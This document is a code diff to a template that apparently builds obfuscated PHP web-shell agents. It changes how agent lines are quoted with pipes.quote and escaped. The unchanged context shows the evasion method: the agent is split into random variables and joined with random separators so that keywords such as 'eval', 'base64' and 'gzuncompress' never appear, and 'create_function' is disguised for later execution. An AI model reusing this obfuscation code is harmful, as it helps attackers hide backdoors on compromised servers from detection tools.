@@ -4,6 +4,7 @@ import itertools
 from core import utilities
 import string
 import re
+import pipes
 %><%
 
 # Does not include \ to avoid escaping termination quotes
@@ -11,17 +12,17 @@ def find_substr_not_in_str(str, characters = string.letters + string.digits + '!
 	while True:
 		substr = utilities.randstr(2, False, characters)
 		if not substr in str:
-			return substr 
+			return substr
 
 def obfuscate(str, obf, division, dangerous):
 	while True:
 		polluted = obf.join(list(utilities.divide(str, 0, division, len(str)/division)))
-		
+
 		found = False
 		for dang in dangerous:
 			if dang in polluted:
 				found = True
-				
+
 		if not found:
 			return polluted
 
@@ -29,7 +30,7 @@ def obfuscate(str, obf, division, dangerous):
 agent_minified = re.sub('[\n\r\t]','',agent)
 
 obfuscation_agent = find_substr_not_in_str(agent_minified)
-obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress')) 
+obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress'))
 
 agent_splitted_line_number = random.randint(10,14)
 
@@ -44,9 +45,13 @@ agent_variables_references = agent_variables[:]
 
 agent_list = []
 for line in agent_splitted:
-	# Lines are quoted now and not before (could separate escape and quote on splitting) 
-	line = re.sub('\'','"', line)
-	agent_list.append((agent_variables.pop(0), "'%s';" % line))
+	# Lines are quoted now and not before (could separate escape and quote on splitting)
+	line = pipes.quote(line)
+
+	# Replace all the \ with \\, to avoid to escape the trailing quote.
+	line = re.sub('\\\\','\\\\\\\\', line)
+
+	agent_list.append((agent_variables.pop(0), '%s;' % line))
 
 obfuscation_createfunc = find_substr_not_in_str('create_function', string.letters)
 obfuscated_createfunc = obfuscate('create_function', obfuscation_createfunc, 2, ())
